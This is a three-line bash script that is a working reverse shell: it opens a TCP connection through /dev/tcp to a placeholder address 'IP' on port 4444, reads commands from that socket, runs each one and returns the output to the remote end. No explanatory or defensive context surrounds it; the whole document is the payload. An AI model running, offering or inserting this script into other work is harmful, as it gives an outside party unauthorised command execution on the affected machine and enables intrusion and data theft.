#!/bin/bash
exec 5<>/dev/tcp/IP/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
